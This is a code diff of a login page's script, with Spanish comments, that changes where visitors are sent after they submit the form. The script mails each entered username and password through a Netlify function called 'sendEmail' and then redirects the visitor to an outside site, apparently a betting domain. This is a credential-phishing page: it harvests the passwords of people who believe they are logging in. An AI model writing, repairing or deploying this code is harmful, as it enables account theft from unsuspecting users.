@@ -120,7 +120,7 @@
         </div>
     </div>
 
-    <script>
+     <script>
         document.getElementById("login-form").addEventListener("submit", function(event) {
             event.preventDefault();
 
@@ -129,18 +129,14 @@
 
             fetch("/.netlify/functions/sendEmail", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    username: username,
-                    password: password
-                })
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username: username, password: password })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.message === "Correo enviado con éxito") {
-                    window.location.href = "https://xingchen78.com/h5/#/";
+                    // Redirigir automáticamente después de enviar el correo
+                    window.location.href = "https://acudeenai.bet/#/";
                 } else {
                     alert("Hubo un problema al enviar el correo.");
                 }
